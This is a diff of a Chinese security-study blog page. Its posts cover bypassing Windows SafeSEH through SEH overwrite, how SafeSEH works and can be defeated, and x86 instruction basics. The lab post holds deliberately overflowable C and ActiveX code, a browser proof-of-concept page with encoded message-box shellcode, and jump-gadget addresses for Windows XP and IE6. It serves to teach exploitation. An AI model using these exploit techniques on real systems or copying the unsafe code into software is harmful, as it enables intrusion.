+    printf("There is an exception");
+    getchar();
+    return 1;
+}
+
+void test(char * input)
+{
+    char str[200];
+    strcpy(str, input);
+    int zero=0;
+    __try
+    {
+        zero = 1/zero;
+    }
+    __except(MyException()){}
+}
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+    //__asm int 3
+    test(shellcode);
+    return 0;
+}
+
+</code></pre>
+
+<h4 id="5-2-实验内容"><a href="#5-2-实验内容" class="headerlink" title="5.2 实验内容"></a>5.2 实验内容</h4><p><b>实验思路：</b></p>
+<ol>
+<li>Test函数存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖程序的SEH</li>
+<li>该程序中所有加载模块都启用了SafeSEH机制，故不能通过未启用SafeSEH的模块来绕过SafeSEH</li>
+<li>将异常处理函数指针覆盖为加载模块外的地址来实现对SafeSEH的绕过，然后通过除0触发异常程序转入异常处理，进而劫持程序流程。</li>
+</ol>
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td>DEP关闭</td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>Visual Studio 2008</td>
+<td></td>
+</tr>
+<tr>
+<td>编译选项</td>
+<td><font color="#f00">禁用优化选项</font></td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>release版本</td>
+</tr>
+</tbody>
+</table>
+<p><b>实验内容：</b></p>
+<ol>
+<li>获取数据：(溢出字符串起始位置0x0012FE88)<br>(距离栈顶最近的异常处理函数句柄0x0012FF60+4)</li>
+<li>使用OllyDbg插件OllyFindAddr，可以在整个程序的内存空间搜索。本实验使用call/jmp dword ptr[ebp+n]指令作为跳板。&quot;Plugins-&gt;OllyFindAddr-&gt;Overflow return address-&gt;Find CALL/JMP [EBP+N]&quot;来进行指令的搜索。</li>
+<li>在0x00280B0B中找到了call [ebp+x030]的指令(但是0x00会被截断，如果是Unicode漏洞就不用考虑这个问题，因为Unicode的结束符号为0x0000)</li>
+<li>使用两段跳的方式跳至shellcode起始处执行<ul>
+<li>通过一个2字节的短跳指令0xEBF6向回跳8个字节</li>
+<li>在这8个字节中布置一条5字节的长跳转指令完成最终的回跳<br><img src="/images/2017-07-08/map_call.jpg" alt="搜索跳板的结果"></li>
+</ul>
+</li>
+</ol>
+<p><b>shellcode组成：</b></p>
+<ol>
+<li>168字节的弹出对话框机器码</li>
+<li>40 * &quot;\x90&quot;</li>
+<li>长跳指令和0x90填充 &quot;\xE9\x2B\xFF\xFF\xFF\x90\x90\x90&quot;</li>
+<li>短跳转指令和0x90填充 &quot;\xEB\xF6\x90\x90&quot;</li>
+<li>跳板指令&quot;\x0B\x0B\x28\x00&quot;</li>
+</ol>
+<p><br></p>
+<h4 id="5-3-验证及其思考"><a href="#5-3-验证及其思考" class="headerlink" title="5.3 验证及其思考"></a>5.3 验证及其思考</h4><p><br><br>由于一开始无法在0x00280B0B处设置断点，所以无法进入去查看,后来使用Animate into之后，能够在0x00280B0B处停止，方便我们调试。进入之后发现跳转指令直接跳转至SEH的链表指针所在地址，这就有我们 前面讲的shellcode来源。</p>
+<h3 id="6-利用Adobe-Flash-Player-ActiveX控件绕过SafeSEH"><a href="#6-利用Adobe-Flash-Player-ActiveX控件绕过SafeSEH" class="headerlink" title="6. 利用Adobe Flash Player ActiveX控件绕过SafeSEH"></a>6. 利用Adobe Flash Player ActiveX控件绕过SafeSEH</h3><p>该方法就是利用未启用SafeSEH模块绕过SafeSEH的浏览器版。Flash Player ActiveX在9.2.124之前的版本不支持SafeSEH，所以若我们能够在这个控件中找到合适的跳板地址，就可以绕过SafeSEH。</p>
+<h4 id="6-1-绕过SafeSEH需要三方面的支持"><a href="#6-1-绕过SafeSEH需要三方面的支持" class="headerlink" title="6.1 绕过SafeSEH需要三方面的支持"></a>6.1 绕过SafeSEH需要三方面的支持</h4><ol>
+<li>具有溢出漏洞的ActiveX控件</li>
+<li>未启用SafeSEH的Flash Player ActiveX控件</li>
+<li>可以触发ActiveX控件中溢出漏洞的POC页面</li>
+</ol>
+<h4 id="6-2-基于MFC的ActiveX控件"><a href="#6-2-基于MFC的ActiveX控件" class="headerlink" title="6.2 基于MFC的ActiveX控件"></a>6.2 基于MFC的ActiveX控件</h4><p>建立好控件工程后，使用类视图中的&quot;VulnerAX_SEHLib-&gt;DVulnerAX-&gt;Add-&gt;Add Method&quot;，添加一个可以在Web页面中调用的接口函数，函数返回类型为void，函数名为test，参数类型为BSTR，参数名为str</p>
+<p>VulnerAX_SEHCtrl.cpp中的test函数</p>
+<pre><code>
+DWORD MyException(void)
+{
+    printf("There is an exception");
+    getchar();
+    return 1;
+}
+
+// CVulnerAX_SEHCtrl message handlers
+
+void CVulnerAX_SEHCtrl::test(LPCTSTR str)
+{
+    //AFX_MANAGE_STATE(AfxGetStaticModuleState());
+    // TODO: Add your dispatch handler code here
+    printf("aaaa");        //定位该函数的标记
+    char dest[100];
+    sprintf(dest, "%s", str);
+    int zero = 0;
+    __try
+    {
+        zero = 1/zero;
+    }
+    __except(MyException())
+    {
+    }
+}
+
+</code></pre>
+
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>Visual Studio 2008</td>
+<td></td>
+</tr>
+<tr>
+<td>优化</td>
+<td><font color="#f00">禁用优化选项</font></td>
+<td></td>
+</tr>
+<tr>
+<td>MFC</td>
+<td>在静态库中使用MFC</td>
+<td>工程属性-&gt;General-&gt;Use of MFC</td>
+</tr>
+<tr>
+<td>字符集</td>
+<td>使用Unicode字符集</td>
+<td>工程属性-&gt;General-&gt;Character Set</td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>release版本</td>
+</tr>
+</tbody>
+</table>
+<p>编译好控件之后，在实验机器上注册该ActiveX控件.regsvr32</p>
+<h4 id="6-3-POC"><a href="#6-3-POC" class="headerlink" title="6.3 POC"></a>6.3 POC</h4><pre><code>
+&lt;html&gt;
+&lt;body&gt;
+&lt;embed src="map.swf" quality="high" type="application/x-shockwave-flash" width="160"
+height="260"&gt;&lt;/embed&gt;
+&lt;object classid="clsid:F010E769-5E95-4DBB-943D-AF2D1FE10C34" id="test"&gt;&lt;/object&gt;
+&lt;script&gt;
+var s = "\u9090";
+while (s.length &lt; 60) {
+    s += "\u9090";
+}
+s += "\u0EEB\u9090";
+s += "\uA0C6\u021D";
+s += "\u9090\u9090\u9090\u9090";
+s += "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857";
+test.test(s);
+&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>这个代码和书上的不一致，但是完全正确。需要注意的是，我们使用的embed中的map.swf需要和该html在同一文件夹下，而object中的classid其实可以从VulnerAX_SEH.idl中找到。注意只能是下面代码中那处显示的uuid，其它位置处的都不行！！！</p>
+<pre><code>
+    //  Class information for CVulnerAX_SEHCtrl
+
+    [ uuid(F010E769-5E95-4DBB-943D-AF2D1FE10C34),
+      helpstring("VulnerAX_SEH Control"), control ]
+    coclass VulnerAX_SEH
+    {
+        [default] dispinterface _DVulnerAX_SEH;
+        [default, source] dispinterface _DVulnerAX_SEHEvents;
+    };
+</code></pre>
+
+<h4 id="6-5-实验内容"><a href="#6-5-实验内容" class="headerlink" title="6.5 实验内容"></a>6.5 实验内容</h4><p><b>实验思路：</b></p>
+<ol>
+<li>在POC页面中随便插入一个Flash，让浏览器能够加载Flash控件</li>
+<li>在POC页面中调用VulnerAX_SEH.ocx控件中的test函数，并向其传递超长字符串，以触发test函数中的溢出漏洞。</li>
+<li>通过溢出手段将VulnerAX_SEH.ocx中的异常处理函数地址覆盖为Flash控件中的跳转地址。由于Flash控件没有启用SafeSEH，所以这个跳板地址可以绕过SafeSEH</li>
+<li>Test函数触发除0异常后，程序会去调用异常处理函数，由于异常处理函数地址已经被覆盖，所以劫持了程序流程。</li>
+</ol>
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>浏览器</td>
+<td>Internet Explorer 6</td>
+<td></td>
+</tr>
+<tr>
+<td>Flash控件版本</td>
+<td>9.0.115.0</td>
+<td>未启用SafeSEH的最后一版9.2.124</td>
+</tr>
+</tbody>
+</table>
+<p><b>实验步骤：</b></p>
+<ol>
+<li>修改POC，将s设置为90字节的0x90，用IE访问POC页面。</li>
+<li>如果浏览器提示ActiveX控件被拦截等信息请自行设置浏览器权限，当浏览器弹出下图所示对话框，就可以用Ollydbg附加IE的进程<font color="#f00">（打开Ollydbg，点击File-&gt;attach，找到IExplorer进程，attach上去即可）</font>，附加好后按F9让程序继续运行<br><img src="/images/2017-07-08/activex.jpg" alt="ActiveX提示"></li>
+<li>找到VulnerAX_SEH.ocx的内存空间，查找字符串&quot;aaaa&quot;，在此位置设置好断点0x100017DC<font color="#f00">（这是最近两天才发现的，设置断点一定要在CPU主界面设置，否则就设置不成功！）</font>。我的方法如下图:先在Memory窗口中找到VulnerAX_SEH所在位置，然后搜索字符串&quot;aaaa&quot;，在rdata中找到了字符串，记下地址0x1003F9F8，再在.text中找字符串&quot;\xF8\xF9\x03\x10&quot;，就可以找到printf(&quot;aaaa&quot;)的位置<br><img src="/images/2017-07-08/breakpoint_printf_aaaa.jpg" alt="查找函数的方法"></li>
+<li>点击浏览器对话框中的&quot;是&quot;按钮，程序会中断在我们设置好的断点位置</li>
+<li>单步执行完sprintf(0x100017F9)之后，得到数据：溢出字符串的起始位置0x0012E014；离栈顶最近的异常处理函数句柄在0x0012E08C+4。故需填充124(0x7C)个字节就可以覆盖到异常处理函数地址。</li>
+<li>在Flash控件中搜索跳板指令。<font color="#f00">通过OllySEEH找到/SafeSEH OFF区域，如图所示。</font>然后使用OllyFindAddr插件的Find CALL/JMP [EBP+N]选项来查找，最后在flash.ocx中找到了多条跳板。如图所示：我们使用0x021DA0C6处的CALL [EBP-0x18]作为跳板<font color="#f00">（不知道怎么回事，有些跳板地址用不了，当你输入0x02187625，但是进入函数之后跳板地址就变为了0x02137625）</font><br><img src="/images/2017-07-08/safeseh.jpg" alt="SafeSEH展示"><br><img src="/images/2017-07-08/call_jmp.jpg" alt="跳板指令"></li>
+<li>程序执行跳板指令后，会回到SEH的链表指针所在地址。即&quot;\u9090\u9090\uA0C6\u021D&quot;处。</li>
+</ol>
+<p><b>shellcode组成：</b></p>
+<ol>
+<li>120字节0x90   60 * &quot;\u9090&quot;</li>
+<li>向后短跳16字节 &quot;\u0EEB\u9090&quot;</li>
+<li>Flash控件的跳板指令地址 &quot;\uA0C6\u021D&quot;</li>
+<li>8字节的0x90填充    &quot;\u9090\u9090\u9090\u9090&quot;</li>
+<li>168字节的弹出对话框机器码<br>&quot;\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3<br>\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08<br>\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd<br>\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c<br>\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38<br>\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857&quot;</li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/07/0day/SafeSEH的保护原理以及攻击方法/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Introspelliam">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/07/0day/SafeSEH的保护原理以及攻击方法/" itemprop="url">SafeSEH的保护原理以及攻击方法</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-07T20:05:58+08:00">
+                2017-07-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="1-启用SafeSEH"><a href="#1-启用SafeSEH" class="headerlink" title="1. 启用SafeSEH"></a>1. 启用SafeSEH</h3><p>通过启用/SafeSEH链接选项可以让编译好的程序具备SafeSEH功能</p>
+<p>VS命令提示行，通过执行&quot;dumpbin /loadconfig 文件名&quot;就可以查看程序安全SEH表的情况。</p>
+<p>可以通过&quot;程序-&gt;Microsoft Visual Studio 2008-&gt;Visual Studio Tools-&gt;Visual Studio 2008 Command Prompt&quot;启用</p>
+<p>具有SafeSEH编译能力的VS 2008在编译程序时将程序中的异常处理函数的地址提取出来放到安全SEH表中</p>
+<h3 id="2-SafeSEH的保护措施"><a href="#2-SafeSEH的保护措施" class="headerlink" title="2. SafeSEH的保护措施"></a>2. SafeSEH的保护措施</h3><ol>
+<li>检查异常处理链是否位于当前程序的栈中，如果不在当前栈中，程序将终止异常处理函数的调用</li>
+<li>检查异常处理函数指针是否指向当前程序的栈中。如果指向当前栈中，程序将终止异常处理函数的调用</li>
+<li>在前面两项检查之后，程序调用全新的函数RtlIsValidHandler()，来对异常处理函数的有效性进行检验。</li>
+</ol>
+<ul>
+<li>首先该函数判断异常处理函数地址是不是在加载模块的内存空间，如果属于加载模块的内存空间，检校函数将依次进行如下判断：<ol>
+<li>判断程序设置IMAGE_DLLCHARACTERISTICS_NO_SEH标识。设置了，异常就忽略，函数返回校验失败。</li>
+<li>检测程序是否包含SEH表。如果包含，则将当前异常处理函数地址与该表进行匹配，匹配成功返回校验成功，否则失败。</li>
+<li>判断 程序是否设置ILonly标识。设置了，标识程序只包含.NET编译人中间语言，函数直接返回校验失败</li>
+<li>判断异常处理函数是否位于不可执行页（non-executable page）上。若位于，校验函数将检测DEP是否开启，如若系统未开启DEP则返回校验成功；否则程序抛出访问违例的异常</li>
+</ol>
+</li>
+<li>如果异常处理函数的地址没有包含在加载模块的内存空间。校验函数将直接执行DEP相关检测，函数将依次进行如下检验：<ol>
+<li>判断异常处理函数是否位于不可执行页（non-executable page）上。若位于，校验函数将检测DEP是否开启，如若系统未开启DEP则返回校验成功；否则程序抛出访问违例的异常</li>
+<li>判断系统是否允许跳转到加载模块的内存空间外执行，如允许则返回校验成功；否则返回校验失败</li>
+</ol>
+</li>
+</ul>
+<p><img src="/images/2017-07-07/RtlIsValidHandler.jpg" alt="RtlIsValidHandler校验流程"></p>
+<p>RtlIsValidHandler()函数的伪代码如下：</p>
+<pre><code>
+BOOL RtlIsValidHandler(handler)
+{
+    if (handler is in image){    //在加载模块内存空间内
+        if (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag ser)
+            return FALSE;
+        if (image has a SafeSEH table)     //含有安全SEH表，说明程序启用SafeSEH
+            if (handler found in the table)    // 异常处理函数地址出现在安全SEH表中
+                return TRUE;
+            else    // 异常处理函数未出现在安全SEH表中
+                return FALSE;
+        if (image is a .NET assembly with the ILonly flag set)     //只包含IL
+            return FALSE;
+    }
+    if (handler is on a non-executable page){    // 跑到不可执行页上
+        if (ExecuteDispatchEnable bit set in the process flags)    //DEP关闭
+            return TRUE;
+        else
+            raise ACESS_VIOLATION; //抛出访问违例异常
+    }
+    if (handler is not in an image){    // 在加载模块内存之外，并且在可执行页上
+        if (ImageDispatchEnable bit set in the process flags)    // 允许在加载模块内存空间外执行
+            return TRUE;
+        else
+            return FALSE;
+    }
+    return TRUE;    //前面所有条件都满足就允许这个异常处理函数执行
+}
+</code></pre>
+
+<h3 id="3-SafeSEH不能解决的问题"><a href="#3-SafeSEH不能解决的问题" class="headerlink" title="3. SafeSEH不能解决的问题"></a>3. SafeSEH不能解决的问题</h3><ol>
+<li>异常处理函数位于加载模块内存范围之外，DEP关闭</li>
+<li>异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH(安全SEH表为空)，同时相应模块不是纯IL</li>
+<li>异常处理函数位于加载模块范围之内，相应模块启用SafeSEH（安全SEH表不为空），异常处理函数地址包含在安全SEH表中</li>
+</ol>
+<p>分析三种情况的可行性：</p>
+<ol>
+<li>只考虑SafeSEH，不考虑DEP干扰，需要在加载模块内存范围之外找到一个跳板指令就可以转入shellcode中执行</li>
+<li>第二种情况中，我们可以利用未启用SafeSEH模块中的指令作为跳板，转入shellcode执行。这也是一再强调SafeSEH需要操作系统与编译器的双重支持。在加载模块中找到一个未启用SafeSEH模块不是很难</li>
+<li>第三种情况下，可以考虑：a)清空安全SEH表，造成该模块未启用SafeSEH假象；b)将指令注册到安全SEH表中。由于安全SEH表的信息在内存中加密存放，所以突破它的可能性不大，放弃！！</li>
+</ol>
+<p>另外突破SafeSEH的方法</p>
+<ol>
+<li>不攻击SEH。使用覆盖返回地址或者虚函数表等信息</li>
+<li>利用SEH的安全校验的严重缺陷——如果SEH中的异常函数指针指向堆区，即使安全校验发现SEH不可信，仍会调用其已修改过的异常处理函数。</li>
+</ol>
+<h3 id="4-名词解释"><a href="#4-名词解释" class="headerlink" title="4. 名词解释"></a>4. 名词解释</h3><h4 id="4-1-DEP"><a href="#4-1-DEP" class="headerlink" title="4.1 DEP"></a>4.1 DEP</h4><p>DEP 数据执行保护 (Data Execution Prevention)。数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码。在 Microsoft Windows XP Service Pack 2及以上版本的Windows中，由硬件和软件一起强制实施 DEP。</p>
+<p>启用方法：<br>修改C:\boot.ini<br>默认为: /noexecute=option /fastdetect        //启用DEP<br>修改为：/execute=option /fastdetect           //关闭DEP</p>
+<h4 id="4-2-IL"><a href="#4-2-IL" class="headerlink" title="4.2 IL"></a>4.2 IL</h4><p>IL可以指Intermediate Language，同MSIL(Microsoft Intermediate Language),是将.NET代码转化为机器语言的一个中间语言的缩写。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/06/code/汇编中常见指令解释/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Introspelliam">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/06/code/汇编中常见指令解释/" itemprop="url">汇编中常见指令解释</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-06T22:01:45+08:00">
+                2017-07-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/code/" itemprop="url" rel="index">
+                    <span itemprop="name">code</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <font color="#f00">这篇博文很有趣，竟然将hexo的content设置给冲垮了，感觉里面写了不可思议的东西，十分值得我去深挖！！！</font>
+
+<p><br></p>
+<h3 id="1-pop-和-push"><a href="#1-pop-和-push" class="headerlink" title="1. pop 和 push"></a>1. pop 和 push</h3><p>常见的汇编指令源码</p>
+<table>
+<thead>
+<tr>
+<th>pop机器码</th>
+<th>含义</th>
+<th>push机器码</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>5f</td>
+<td>pop edi</td>
+<td>57</td>
+<td>push edi</td>
+</tr>
+<tr>
+<td>5e</td>
+<td>pop esi</td>
+<td>56</td>
+<td>push esi</td>
+</tr>
+<tr>
+<td>5d</td>
+<td>pop ebp</td>
+<td>55</td>
+<td>push ebp</td>
+</tr>
+<tr>
+<td>5c</td>
+<td>pop esp</td>
+<td>54</td>
+<td>push esp</td>
+</tr>
+<tr>
+<td>5b</td>
+<td>pop ebx</td>
+<td>53</td>
+<td>push ebx</td>
+</tr>
+<tr>
+<td>5a</td>
+<td>pop edx</td>
+<td>52</td>
+<td>push edx</td>
+</tr>
+<tr>
+<td>59</td>
+<td>pop ecx</td>
+<td>51</td>
+<td>push ecx</td>
+</tr>
+<tr>
+<td>58</td>
+<td>pop eax</td>
+<td>50</td>
+<td>push eax</td>
+</tr>
+</tbody>
+</table>
+<h3 id="2-call"><a href="#2-call" class="headerlink" title="2. call"></a>2. call</h3><pre><code>
+call (short) eax
+1.将当前指令的下一条指令的地址压入栈中；
+2.JMP到EAX这个地址。
+</code></pre>
+
+<pre><code>
+call (long) eax
+1.将CS压入栈中；
+2.将当前指令的下一条指令的地址压入栈中；
+2.JMP到EAX这个地址。
+</code></pre>
+
+<h3 id="3-retn-和-retf"><a href="#3-retn-和-retf" class="headerlink" title="3. retn 和 retf"></a>3. retn 和 retf</h3><pre><code>
+retn
+1.将当前的ESP中指向的地址出栈；
+2.JMP到这个地址。
+</code></pre>
+
+<pre><code>
+retn k
+1.将当前的ESP中指向的地址出栈；
+2.JMP到这个地址；
+3.弹出栈顶的k个字节的数据
+</code></pre>
+
+<pre><code>
+retf
+1.将当前的ESP中指向的地址出栈给EIP；
+2.将当前的ESP中指向的地址出栈给CS；
+2.JMP到这个地址。
+</code></pre>
+
+<h3 id="4-jmp"><a href="#4-jmp" class="headerlink" title="4. jmp"></a>4. jmp</h3><pre><code>
+<font color="#f00">jmp短跳</font>
+\xeb\xf6:     jmp short $-8（其中$指代当前EIP）
+
+在Asm2MachineCode(x86)中如果要尝试jmp short $-8，是不可能实现的，但是我们可以：
+1. ImageBase（hex）设置为0012ff60 <font color="#f00">(此处为当前的EIP地址)</font>
+2. jmp short 0012FF58
+  </code></pre>
+
+<pre><code>
+<font color="#f00">jmp长跳</font>
+\xE9\x2B\xFF\xFF\xFF\xFF: jmp 0x0012FF30
+
+在Asm2MachineCode(x86)中如果要尝试jmp short $-8，是不可能实现的，但是我们可以：
+1. ImageBase（hex）设置为0012ff58 <font color="#f00">(此处为当前的EIP地址)</font>
+2. jmp 0012FE88
+
+</code></pre>
+
+<h3 id="5-cmp"><a href="#5-cmp" class="headerlink" title="5. cmp"></a>5. cmp</h3><p>cmp op1, op2</p>
+<p>ZF=1 这个简单，则说明两个数相等</p>
+<p>当无符号时：<br>CF=1 则说明了有进位或借位，cmp是进行的减操作，故可以看出为借位，所以，此时oprd1&lt;oprd2<br>CF=0 则说明了无借位，但此时要注意ZF是否为0，若为0，则说明结果不为0，故此时oprd1&gt;oprd2</p>
+<p>当有符号时：<br>若SF=0，OF=0 则说明了此时的值为正数，没有溢出，可以直观的看出，oprd1&gt;oprd2<br>若SF=1，OF=0 则说明了此时的值为负数，没有溢出，则为oprd1&lt;oprd2<br>若SF=0，OF=1 则说明了此时的值为正数，有溢出，可以看出oprd1&lt;oprd2<br>若SF=1，OF=1则说明了此时的值为负数，有溢出，可以看出oprd1&gt;oprd2</p>
+<p>最后两个可以作出这种判断的原因是，溢出的本质问题：<br>两数同为正，相加，值为负，则说明溢出<br>两数同为负，相加，值为正，则说明溢出<br>故有，正正得负则溢出，负负得正则溢出</p>
+<h3 id="6-leave"><a href="#6-leave" class="headerlink" title="6. leave"></a>6. leave</h3><p>leave在32位汇编下相当于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov esp,ebp                                            </div><div class="line">pop ebp</div></pre></td></tr></table></figure>
+<h3 id="7-les"><a href="#7-les" class="headerlink" title="7. les"></a>7. les</h3><p>LES( load ES)指令的功能是：把内存中指定位置的双字操作数的低位字装入指令中指定的寄存器、高位字装入ES寄存器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">LES DSET，SRC</div><div class="line">LES REG，MEM</div><div class="line">DEST为destination(目的地址)，SRC为source(源地址)；</div><div class="line">REG为register(CPU寄存器)，MEM为memory(内存地址)。</div></pre></td></tr></table></figure>
+<p>DEST=WORD PTR[SRC]</p>
+<p>ES=WORD PTR[SRC+2]</p>
+<p>DEST赋值为SRC处双字的低位；</p>
+<p>ES赋值为SRC处双字的高位；</p>
+<h3 id="8-比较"><a href="#8-比较" class="headerlink" title="8. 比较"></a>8. 比较</h3><p>A（above）大于、B（below）小于、E（equal）等于，用于比较无符号数</p>
+<p>G（great）大于、L（less than）小于、E（equal）等于，用于比较带符号数</p>
+<p>其实这些地方也是漏洞点，有时候比较没有对是否有符号进行确定，所以可能会出问题。</p>
+<h3 id="9-lods-stos"><a href="#9-lods-stos" class="headerlink" title="9. lods/stos"></a>9. lods/stos</h3><p>lodsb指令，将esi指向的地址处的数据取出来赋给AL寄存器, esi=esi+1；</p>
+<p>lodsw指令则取得是一个字。</p>
+<p>lodsd指令，取得是双字节，即mov eax，[esi]，esi=esi+4；</p>
+<p>stosb指令，将AL寄存器的值取出来赋给edi所指向的地址处。mov [edi]，AL；edi=edi+1；</p>
+<p>stosw指令去的是一个字。</p>
+<p>stosd指令，取得是双字节，mov [edi]，eax；edi=edi+4；</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/9/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/11/"><i class="fa fa-angle-right"></i></a>
